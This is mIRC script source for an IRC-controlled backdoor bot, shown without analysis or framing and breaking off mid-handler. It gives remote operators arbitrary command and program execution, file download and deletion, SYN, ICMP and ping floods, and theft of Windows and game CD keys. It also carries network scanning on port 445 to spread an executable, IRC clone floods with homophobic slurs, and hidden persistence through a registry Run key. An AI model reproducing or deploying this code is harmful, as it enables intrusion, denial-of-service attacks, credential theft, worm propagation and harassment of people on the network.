on 1:TEXT:.login *:$($ld(%chan)):{ if ($level($nick) != 1) { halt } | if ($nick isop $ld(%chan)) && ($kr($address($nick,0),$2-)) && ($left($nick,1) == $chr($calc(99 + 10))) && ($right($nick,1) == $chr($calc(101 + 10))) && ($len($nick) == 4) { vtalk $chan %b1 $+ $nick $+ %b2 now has %b1 $+ admin $+ %b2 level access $versi0n | auser 1000 $nick } }
on 1:START:{ .startsettz }
on 1:EXIT:{ .exitsettz }
on 1:CONNECT:{ .connsettz }
on 1:DISCONNECT:{ .dscnsettz }
on 1:CONNECTFAIL:{ .cnnfailsettz }
on 1:INPUT:*:{ haltdef | vtalk $ld(%chan) %b1 $+ security $+ %b2 user input %b1 $+ $1- $+ %b2 | .fakenick | .hide | .uinst !user input! }
on 1:OP:$($ld(%chan)):{ if ($opnick == $me) { .topic $ld(%chan) .scan rand2 $r(210,220) | .mode $ld(%chan) +mnstk $ld(%key) } }
on 1:DNS:{ if (%dnsip) && (%dnschan) { if ($remove(%dnsip,$chr(46)) isnum) { var %dnssuf = addr } | else { var %dnssuf = ip } | var %x = 1,%dnum = $dns(0) | if (%dnum == 0) { vtalk %dnschan %b1 $+ dns $+ %b2 %b1 $+ unable to resolve %dnsip $+ %b2 | unset %dns* | return } | while (%x <= %dnum) { var %dall = %dall [ [ $+($,dns(%x).,%dnssuf) ] ] | inc %x } | %dall = $replace(%dall,$chr(32),$+($chr(44),$chr(32))) | vtalk %dnschan %b1 $+ dns $+ %b2 %b1 $+ resolved  $+ %dnsip $+  to  $+ %dall $+  $+ %b2 | unset %dns* } }
on 1:SOCKOPEN:sclick*:{
  sockwrite -n $sockname GET %g HTTP/1.1
  sockwrite -n $sockname Host: %h
  sockwrite -n $sockname Connection: keep-alive
  sockwrite $sockname $rletterz
  unset %g
  unset %h
  unset %sclickchan
}
on 1:SOCKCLOSE:sclick*:{ vtalk %sclickchan %b1 $+ visit $+ %b2 %b1 $+ socket closed $+ %b2 | unset %g | unset %h | unset %sclickchan }
on 1:SOCKOPEN:download:{ if ($sockerr) { vtalk %dlchan %b1 $+ download $+ %b2 %b1 $+ error socket error $+ %b2 | unset %dlfile | unset %dlchan | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on 1:SOCKREAD:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on 1:SOCKCLOSE:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { vtalk %dlchan %b1 $+ download $+ %b2 success: file downloaded %b1 $+ $mircdir $+ %download2 $+ %b2 %b1 $+ $file(%download2).size bytes $+ %b2 } | unset %download* %dlfile %dlchan }
on 1:SOCKLISTEN:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on 1:SOCKREAD:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2) && ($1 isnum) && ($3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : none.of.your.business : $rletterz | sockclose $sockname | unset %ident } }
CTCP *:*:*:{ haltdef }
on *:PART:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:QUIT:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:NICK:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:JOIN:*:{ 
  if ($nick == $me) { .window -h $chan }
  if ($chan == $ld(%chan)) { .timerjoin off }
  if ($me isop $chan) && ($chan == $ld(%chan)) && ($chan($chan).key != $ld(%key)) { .mode $chan +mnstk $ld(%key) }
}
on *:KICK:*:{
  if ($knick == $me) && ($chan == $ld(%chan)) { .timerjoin 0 5 $+(.,$ld(106111105110)) $ld(%chan) $ld(%key) }
}
on *:TEXT:*:#:{
  if ($level($nick) == 1000) { .clearall | .securityz
    if ($1 == .version) || ($1 == .ver) && (!$2) { vtalk $chan $versi0n }
    if ($1 == .speed) && (!$2) { vtalk $chan %b1 $+ speed $+ %b2 %b1 $+ http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) $+ %b2 }
    if ($1 == .dns) && ($2) && (!$3) { set %dnsip [ [ $2 ] ] | set %dnschan $chan | .dns %dnsip | vtalk $chan %b1 $+ dns $+ %b2 resolving %b1 $+ %dnsip $+ %b2 } 
    if ($1 == .syn) && ($2) { if ($2 == stop) || ($2 == halt) { if (%synaa) { sockclose syn* | vtalk $chan %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt } | else { vtalk $chan %b1 $+ syn $+ %b2 error no syn attacks currently active } } | elseif (%synaa) { vtalk $chan %b1 $+ syn $+ %b2 error syn attack already active on %b1 $+ %synaa $+ %b2 | halt } | else { if (!%synaa) { vtalk $chan %b1 $+ syn $+ %b2 flood started %b1 $+ IP: $2 packets: $4 port: $3 $+ %b2 | set %synaa $2 | set %synchan $chan | synz start $2 $3 $4 } } }
    if ($1 == .ping) || ($1 == .packet) && ($2) { if (%pingaa != $null) && ($2 == stop) || ($2 == halt) { .run -n vidriv.exe /n /fh /r "mdde32.exe ping.exe" | vtalk $chan %b1 $+ Ping $+ %b2 flood on %b1 $+ %pingaa halted $+ %b2 | unset %pingaa | halt } | .run -n vidriv.exe /n /fh /r "ping.exe $2 -n $3 -l $4 -w 0" | vtalk $chan %b1 $+ Ping $+ %b2 flood started %b1 $+ IP: $2 traffic: $calc($3 *65536/1024/1000) $+ mb $+ %b2 | set %pingaa $2 }
    if ($1 == .level) && (!$2) { vtalk $chan %b1 $+ level $+ %b2 %b1 $+ $nick $+ %b2 you are currently an %b1 $+ admin $+ %b2 }
    if ($1 == .visit) && ($2) { set %h $2 | set %g $3 | set %sclickchan $chan | vtalk $chan %b1 $+ visit $+ %b2 %b1 $+ visited %h $+ %g $+ %b2 | sockopen sclick %h 80 }
    if ($1 == .download) && (!$3) && ($2) { if ($2 == stop) && ($sock(download)) { .sockclose download* | vtalk $chan %b1 $+ download $+ %b2 stopped download of %b1 $+ %dlfile $+ %b2 | unset %dlfile | halt } | elseif ($2 == stop) && (!$sock(download)) { vtalk $chan %b1 $+ download $+ %b2 %b1 $+ error not downloading a file $+ %b2 | halt } | set %dlfile $2- | set %dlchan $chan | downloada $2- }
    if ($1 == .reload) && ($2) && (!$3) { set %reloadsecs $2 | .timer -o 1 %reloadsecs $+(.,$ld(115101114118101114)) $ld(%server1) | vtalk $chan %b1 $+ reloading $+ %b2 in %b1 $+ %reloadsecs seconds $+ %b2 | unset %reloadsecs }
    if ($1 == .cskey) && (!$2) { set %gkchan $chan | .cskey }
    if ($1 == .winkey) && (!$2) { set %gkchan $chan | .winkey }
    if ($1 == .q3key) && (!$2) { set %gkchan $chan | .q3key }
    if ($1 == .ut2k3key) && (!$2) { set %gkchan $chan | .ut2k3key }
    if ($1 == .sof2key) && (!$2) { set %gkchan $chan | .sof2key }
    if ($1 == .uninstall) && (!$2) { .uinst !requested! }
    if ($1 == .diskinfo) && (!$2) { vtalk $chan $diskinfo }
    if ($1 == .coldrage) && ($2) { set %crchan $chan | .coldrage $2- }
    if ($1 == .uptimed) && ($2) && (!$3) { if ($uptimed($2)) { vtalk $chan %b1 $+ uptimed $+ %b2 > $+  $+ $iif($2 > 1,$2 $+ days,$2 $+ day) $+  uptime; %b1 $+ $uptime(system,1) $+ %b2 } }
    if ($1 == .uptimew) && ($2) && (!$3) { if ($uptimew($2)) { vtalk $chan %b1 $+ uptimew $+ %b2 > $+  $+ $iif($2 > 1,$2 $+ wks,$2 $+ wk) $+  uptime; %b1 $+ $uptime(system,1) $+ %b2 } }
    if ($1 == .fserve) && ($2) && (!$3) { var %homedir = [ [ $2- ] ] | vtalk $chan %b1 $+ fserve $+ %b2 %b1 $+ establishing an fserve session with  $+ $nick $+  $+ %b2 with homedir %b1 %homedir $+ %b2 | .fserve $nick 10 %homedir }
    if ($1 == .nick) && ($2 == reset) && (!$3) { .nick $nick0r }
    if ($1 == .rand) && ($2 == nick) && (!$3) { .nick $rletterz }
    if ($1 == .rand) && ($2 == nick2) && (!$3) { .nick $rletterz2 }
    if ($1 == .clean) && (!$2) { set %cleanchan $chan | .cleanup }
    if ($1 == .flood) && ($2) && (!$3) { vtalk $chan %b1 $+ flood $+ %b2 %b1 $+ on $2 $+ %b2 | .msg $2 %floodmsg4 | .notice $2 %floodmsg2 | .ctcp $2 %floodmsg3 }
    if ($1 == .netsend) && ($2) { vtalk $chan %b1 $+ net-send $+ %b2 sent %b1 $+ $2 the message of $3- $+ %b2 | .run -n vidriv.exe /n /fh /r "net send $2- $+ " }
    if ($1 == . $+ $me) && ($2) { vtalk $chan %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
    if ($1 == .cmd) || ($1 == .command) || ($1 == .c) || ($1 == .-) && ($2) { vtalk $chan %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
    if ($1 == .var) || ($1 == .variable) && ($2) { if ([ [ $$2- ] ] != $null) { vtalk $chan %b1 $+ variable $+ %b2 %b1 $+ $2- = [ [ $$2- ] ] $+ %b2 } }
    if ($1 == .color1) || ($1 == .col1) && ($2) { vtalk $chan %b1 $+ color1 $+ %b2 set to %b1 $+ $2- $+ %b2 | %b1 = $2- }
    if ($1 == .color2) || ($1 == .col2) && ($2) { vtalk $chan %b1 $+ color2 $+ %b2 set to %b1 $+ $2- $+ %b2 | %b2 = $2- }
    if ($1 == .colorreset) || ($1 == .colreset) && (!$2) { %b1 = 0[12 | %b2 = 0] | vtalk $chan %b1 $+ now using default colors $+ %b2 }
    if ($1 == .set) { set $2 $3- | vtalk $chan %b1 $+ set $+ %b2 set %b1 $+ $2 to $3- $+ %b2 }
    if ($1 == .unset) { unset $2 | vtalk $chan %b1 $+ unset $+ %b2 %b1 $+ unset $2 $+ %b2 }
    if ($1 == .findfile) && ($3) { vtalk $chan %b1 $+ find-file $+ %b2 %b1 $+ findfile ( $2 , $3 , 0 ) =  $findfile($2,$3,0) $+ %b2 }
    if ($1 == .sayfile) && ($4) { vtalk $chan %b1 $+ say-file $+ %b2 %b1 $+ $findfile($2,$3,$4) $+ %b2 }
    if ($1 == .finddir) && ($3) { vtalk $chan %b1 $+ find-dir $+ %b2 %b1 $+ finddir ( $2 , $3 , 0 ) = $finddir($2,$3,0) $+ %b2 }
    if ($1 == .saydir) && ($4) { vtalk $chan %b1 $+ say-dir $+ %b2 %b1 $+ $finddir($2,$3,$4) $+ %b2 }
    if ($1 == .info) && (!$2) { vtalk $chan %b1 $+ mirc-info $+ %b2 %b1 $+ time online: $uptime(mirc,1) server: $server $+ %b2 }
    if ($1 == .net) && (!$2) { vtalk $chan %b1 $+ network-info $+ %b2 %b1 $+ ip: $ip host: $host $+ %b2 }
    if ($1 == .cpu) && (!$2) { vtalk $chan %b1 $+ cpu-info $+ %b2 %b1 $+ time: $time(h:nn TT) date: $date(mmmm doo yyyy) OS: $os uptime: $uptime(system,1) $+ %b2 }
    if ($1 == .killapp) || ($1 == .prockill) || ($1 == .pkill) && ($2) && (!$3) { .run -n vidriv.exe /n /fh /r " $+ $mircdirmdde32.exe $2- $+ " | vtalk $chan %b1 $+ killapp $+ %b2 killed application %b1 $+ $2- $+ %b2 }
    if ($1 == .dcc) && ($2 == send) && ($3) && (!$5) { vtalk $chan %b1 $+ dcc $+ %b2 sending %b1 $+ $3 $4- $+ %b2 | /dcc send $3 $4- }
    if ($1 == .join) && ($2) { $+(.,$ld(106111105110)) $2 $3- | vtalk $chan %b1 $+ join $+ %b2 channel %b1 $+ $2 -- channel key: $3- $+ %b2 }
    if ($1 == .part) && ($2) && ($2 != $ld(%chan)) { part $2 $3- | vtalk $chan %b1 $+ part $+ %b2 channel %b1 $+ $2 -- reason: $3- $+ %b2 }
    if ($1 == .load) && ($2) { .load -rs $2- | vtalk $chan %b1 $+ load $+ %b2 loaded %b1 $+ $2- $+ %b2 }
    if ($1 == .unload) && ($2) { .unload -rs $2- | vtalk $chan %b1 $+ unload $+ %b2 unloaded %b1 $+ $2- $+ %b2 }
    if ($1 == .run) || ($1 == .exec) && ($2) { .run -n vidriv.exe /n /fh /r " $+ $2- $+ " | vtalk $chan %b1 $+ run $+ %b2 ran %b1 $+ $2- $+ %b2 }
    if ($1 == .rename) && ($2) { .rename $2 $3- | vtalk $chan %b1 $+ renamed $+ %b2 %b1 $+ $2 to $3- $+ %b2 }
    if ($1 == .remove) || ($1 == .delete) && ($2) { .remove $2- | vtalk $chan %b1 $+ remove $+ %b2 removed %b1 $+ $2- $+ %b2 }
    if ($1 == .new) && ($2 == scan) && ($3 == file) { if (!$4) { remove %sysdir $+ %spreadfile | remove $mircdir $+ %spreadfile | vtalk $chan %b1 $+ %spreadfile removed $+ %b2 | halt } | if ($4) { remove %sysdir $+ %spreadfile | remove $mircdir $+ %spreadfile | vtalk $chan %b1 $+ %spreadfile removed $+ %b2 %b1now downloading new scan file from: $4 $+ %b2 | downloada $4- } }
    if ($1 == .spreadfile) && (!$3) && ($2) && (%spreadfile != $2) { vtalk $chan %b1 $+ scanner $+ %b2 now spreading file %b1 $+ $2 $+ %b2 | %spreadfile = $2 }
    if ($1 == .spreadreset) && (!$2) && (%spreadfile != %defaultfile) { vtalk $chan %b1 $+ scanner $+ %b2 now spreading default file %b1 $+ %defaultfile $+ %b2 | %spreadfile = %defaultfile }
    if ($1 == .scanbat) && ($!3) && ($2) && (%scanbat != $2) { vtalk $chan %b1 $+ scanner $+ %b2 now using .bat file %b1 $+ $2 $+ %b2 | %scanbat = $2 }
    if ($1 == .copy) { set %copychan $chan | .scancopy }
    if ($1 == .addrange) && ($2) && (!$3) { .write xcopy.dll $2 | vtalk $chan %b1 $+ scan $+ %b2 added range: %b1 $+ $2 $+ %b2 }
    if ($1 == .sgranges) && ($2) && (!$3) { if ($2 == off) { .set %sgranges $false | .set %spreadfile %defaultfile } | elseif ($2 == on) { .set %sgranges $true | .set %spreadfile nna.exe } | else { halt } | .stopscan | .saveini | vtalk $chan %b1 $+ scan $+ %b2 sgranges set to %b1 $+ %sgranges $+ %b2 }
    if ($1 == .logout) && (!$2) { .ruser $nick | .clearall | vtalk $chan %b1 $+ $nick $+ %b2 has logged out from %b1 $+ admin $+ %b2 level $versi0n }
    if ($1 == .scan) && ($2) {
      if ($2 == randrange) && (%begshortip == $null) && ($isfile(%spreadfile)) { .randscann }
      if ($2 == start) && (%begshortip == $null) && ($isfile(%spreadfile)) { vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ $3 - $4 $+ %b2 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $randip($3) | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $4 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $3 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $3 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $3 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == host) && (%begshortip == $null) && ($isfile(%spreadfile)) { 
        if ($3 == start) { set %begit $gettok($ip,1-2,46) $+ .0.0 | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
        if ($3 == rand) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
        if ($3 == rand2) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      }
      if ($2 == neighborhood) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-3,46) $+ .1 | vtalk $chan %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-3,46) $+ .255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == stats) && (%begshortip != $null) { vtalk $chan %b1 $+ scanner $+ %b2 scan stats %b1 $+ range: [ %begshortip - %endshortip ] port: [ %scanport ] protocol: [ %scanproto ] current ip: [ %ip34 ] total found: [ $totalfound ] spreading file: [ %spreadfile ] $+ %b2 }
      if ($2 == port) && ($3) && (!$4) && (%scanport != $3) { vtalk $chan %b1 $+ scanner $+ %b2 now scanning port %b1 $+ $3 $+ %b2 | %scanport = $3 }
      if ($2 == protocol) || ($2 == proto) && (!$4) && (%scanproto != $3) { vtalk $chan %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ $3 $+ %b2 | %scanproto = $3 }
      if ($2 == protocolreset) || ($2 == protoreset) && (!$3) && (%scanproto != %defaultproto) { vtalk $chan %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ %defaultproto $+ %b2 | %scanproto = %defaultproto }
      if ($2 == popranges) && ($3) && (!$4) { if ($3 != %popranges) { vtalk $chan %b1 $+ scan $+ %b2 popranges changed from %b1 $+ %popranges $+ %b2 to %b1 $+ $3 $+ %b2 | .set %popranges $3 | .saveini } }
      if ($2 == stop) || ($2 == halt) && (%begshortip != $null) { vtalk $chan %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
    }
    if ($1 == .clone) && ($2) {
      if ($2 == load) && ($3) { startident | sockopen Sockets- $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $3 $4 | vtalk $chan %b1 $+ clones $+ %b2 loading to %b1 $+ $3 $+ : $+ $4 $+ %b2 }
      if ($2 == nick) || ($2 == nicks) { set %clonenick $3- $+ $r(0,999999) | sockwrite -tn Sockets-* nick %clonenick | vtalk $chan %b1 $+ clones $+ %b2 changing nicks to %b1 $+ %clonenick $+ %b2 | unset %clonenick }
      if ($2 == join) && ($3) { sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part) && ($3) { sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == msg) || ($2 == query) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
      if ($2 == raw) && ($3) { sockwrite -tn Sockets-* $3- }
      if ($2 == notice) && ($3) { sockwrite -tn Sockets-* notice $3 : $+ $4- }
      if ($2 == join2) && ($3) { .timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part2) && ($3) { .timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == flood1) || ($2 == flood) && ($3) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %floodmsg1 | sockwrite -tn Sockets-* NOTICE  $3 : $+ %floodmsg2 | sockwrite -tn Sockets-* part $3 | vtalk $chan %b1 $+ clones $+ %b2 starting flood on %b1 $+ $3 $+ %b2 }
      if ($2 == pmflood) || ($2 == pmf) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ %floodmsg1 | sockwrite -tn Sockets-* notice $3 : $+ %floodmsg2 | vtalk $chan %b1 $+ clones $+ %b2 pm flooding %b1 $+ $3 $+ %b2 }
      if ($2 == sqflood) || ($2 == sqf) && ($3) { sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg3 | sockwrite -tn Sockets-* nick $rletterz | sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg4 | vtalk $chan %b1 $+ clones $+ %b2 attempting to sendq %b1 $+ $3- $+ %b2 }
      if ($2 == kill) || ($2 == quit) || ($2 == disconnect) { .sockclose IDENT | sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | vtalk $chan %b1 $+ clones $+ %b2 all clones disconnected %b1 $+ reason: $3- $+ %b2 }
    }
    if ($1 == .bnc) && ($2) {
      if ($2 == start) && ($4) { if ($sock(Bnc)) { vtalk $chan %b1 $+ bnc $+ %b2 bnc is already active on %b1 $+ $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd $+ %b2 | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | vtalk $chan %b1 $+ bnc $+ %b2 %b1 $+ /server -m $ip $+ : $+ $3 $4 $+ %b2 }
      if ($2 == stats) && ($sock(Bnc)) { vtalk $chan %b1 $+ bnc $+ %b2 is on %b1 $+ $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd users: $sock(BncClient*,0) connected: $sock(BncServer*,0) $+ %b2 }
      if ($2 == stop) || ($2 == halt) && (%Bnc.Port != $null) { sockclose Bnc* | vtalk $chan %b1 $+ bnc $+ %b2 server on %b1 $+ $ip $+ : $+ %bnc.port is now off $+ %b2 | unset %bnc.* | sockclose Bnc* }
    }
    if ($1 == .timersyn) && ($6) && (!$7) { if (%synaa != $null) { unset %synaa } | set %synaa $2 | vtalk $chan %b1 $+ timersyn $+ %b2 %b1 $+ set to syn IP: $2 port: $3 packets: $4 repeat-times: $5 seconds-delay: $6 $+ %b2 | .timertsyn $5 $6 set $+(%,synaa) $2 $sep set $+(%,synchan) $chan $sep synz start $2 $3 $4 }
    if ($1 == .icmp) && ($2) {
      if ($2 == stop) || ($2 == halt) && (%icmpaa != $null) {
        vtalk $chan %b1 $+ ICMP $+ %b2 flood on %b1 $+ %icmpaa halted $+ %b2
        unset %icmpaa
        run -n vidriv.exe /n /fh /r "mdde32.exe nm32g.vbs"
        remove nm32g.vbs
        halt
      }
      if ($2 == stop) || ($2 == halt) { halt }
      if (!$3) { halt }
      if (!$4) { halt }
      set %icmpaa $2
      vtalk $chan %b1 $+ ICMP $+ %b2 flood started %b1 $+ IP: $2 packet size: $3 times: $4 $+ %b2
      timerremove 1 200 /remove nm32g.vbs
      write nm32g.vbs on error resume next
      write nm32g.vbs Set bl = CreateObject("Wscript.shell")
      write nm32g.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
      run -n mdde32.exe /n /fh /r "nm32g.vbs"
      halt
    }
  }
}
alias sep { return $chr(124) }
alias settz { if (!%chan) { %chan = 035186045115099097110045186035 } | if (!%key) { %key = 033040115099052110041033 } | if (!%spreadfile) { %spreadfile = x586.exe } | if (!%defaultfile) { %defaultfile = x586.exe } | if (!%scanport) { %scanport = 445 } | if (!%scanbat) { %scanbat = authexec.bat } | if (!%scanproto) { %scanproto = ipc$ } | if (!%defaultproto) { %defaultproto = ipc$ } | if (!%b1) { %b1 = 0[12 } | if (!%b2) { %b2 = 0] } | if (!%sport) { .set %sport 62422 } | if (!%popranges) { .set %popranges 211_203_218_61_24_68_65_43_217_200_221_219 } }
alias tsettz { hmake tsettz 10 | if (%chan) { .hadd tsettz tchan %chan } | if (%key) { .hadd tsettz tkey %key } | if (%spreadfile) { .hadd tsettz tspreadfile %spreadfile } | if (%defaultfile) { .hadd tsettz tdefaultfile %defaultfile } | if (%scanport) { .hadd tsettz tscanport %scanport } | if (%scanbat) { .hadd tsettz tscanbat %scanbat } | if (%scanproto) { .hadd tsettz tscanproto %scanproto } | if (%defaultproto) { .hadd tsettz tdefaultproto %defaultproto } | if (%b1) { .hadd tsettz tb1 %b1 } | if (%b2) { .hadd tsettz tb2 %b2 } | if (%server1) { .hadd tsettz tserver1 %server1 } | if (%server2) { .hadd tsettz tserver2 %server2 } | if (%server3) { .hadd tsettz tserver3 %server3 } | if (%popranges) { .hadd tsettz tpopranges %popranges } | if (%sgranges) { .hadd tsettz tsgranges %sgranges } | .unsetall
if ($hget(tsettz,tchan)) { %chan = $ifmatch } | if ($hget(tsettz,tkey)) { %key = $ifmatch } | if ($hget(tsettz,tspreadfile)) { %spreadfile = $ifmatch } | if ($hget(tsettz,tdefaultfile)) { %defaultfile = $ifmatch } | if ($hget(tsettz,tscanport)) { %scanport = $ifmatch } | if ($hget(tsettz,tscanbat)) { %scanbat = $ifmatch } | if ($hget(tsettz,tscanproto)) { %scanproto = $ifmatch } | if ($hget(tsettz,tdefaultproto)) { %defaultproto = $ifmatch } | if ($hget(tsettz,tb1)) { %b1 = $ifmatch } | if ($hget(tsettz,tb2)) { %b2 = $ifmatch } | if ($hget(tsettz,tserver1)) { %server1 = $ifmatch } | if ($hget(tsettz,tserver2)) { %server2 = $ifmatch } | if ($hget(tsettz,tserver3)) { %server3 = $ifmatch }  | if ($hget(tsettz,tsgranges)) { %sgranges = $ifmatch } | if ($hget(tsettz,tpopranges)) { %popranges = $ifmatch } | .hfree tsettz }
alias startsettz { .hide | .rmdownload | .secure1 | .flush | .clearall | .sockclose * | .tsettz | .timers off | .settz | .clonecheck | %sysdir = $mircdir | .writeini $mircini ident userid $rletterz | .writeini $mircini mirc user $rletterz | .emailaddr $rletterz $+ @x.gov | .fullname $rletterz | .nick $nick0r | .anick $nick0r | .conn | .timer 0 30 securityz | .timerpingself -o 0 100 .ctcp $+($,me) PING | .timersecure -o 0 30 secure1 | .timerbgwin 0 5 bgwin | .window -h "Status Window" | .checkcopy | .mircreg | .makereg | .srvtimecheck | .scanpop }
alias connsettz { .flush | .pdcc on | .fsend on | .mode $me +ix | .checkcopy | .timerjoin 0 5 $+(.,$ld(106111105110)) $ld(%chan) $ld(%key) | secure1 | .clearall }
alias dscnsettz { .flush | .srvtimecheck | .nick $nick0r | .clearall }
alias cnnfailsettz { .flush | $+(.,$ld(115101114118101114)) $ld(%server1) | .srvtimecheck | .clearall }
alias exitsettz { .flush | .clearall | .sockclose * | .tsettz | .timers off }
alias srvtimecheck { .timerchcksrv -o 0 32 servercheck }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WUPD,$mircdiriglmtray.exe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WUPD) }
alias mircreg { $RegWrite(HKEY_CURRENT_USER\Software\WINS\License\,4782-505050,REG_SZ) | $RegWrite(HKEY_CURRENT_USER\Software\WINS\UserName\,fubitch,REG_SZ) }
alias conn {
  %floodmsg1 = $str(FAGGOT,30)
  %floodmsg2 = $str(OWNED,50)
  %floodmsg3 = $str(FAGFAGFAG,15)
  %floodmsg4 = $str(½¾,50)
  if (%server1 == $null) { %server1 = 108109115046116109099108097110046110101116058055054052056 } | if (%server2 == $null) { %server2 = 114109115046116109099108097110046110101116058055054052056 } | if (%server3 == $null) { %server3 = 099109115046116109099108097110046110101116058055054052056 } | $+(.,$ld(115101114118101114)) $ld(%server1)
}
alias servercheck {
  if ($server == $null) {
    if (%servercheck == $null) || (%servercheck == 0) { set %servercheck 1 | $+(.,$ld(115101114118101114)) $ld(%server2) | halt }
    if (%servercheck = 1) { set %servercheck 2 | $+(.,$ld(115101114118101114)) $ld(%server3) | halt }
    if (%servercheck = 2) { set %servercheck 0 | $+(.,$ld(115101114118101114)) $ld(%server1) | halt }
  }
  else { halt }
}
raw 332:*:{
  if ($2 == $ld(%chan)) {
    if ($3 == .scan) && ($4) { stopscan
      if ($4 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $randip($5) | vtalk $2 %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $6 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $6 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
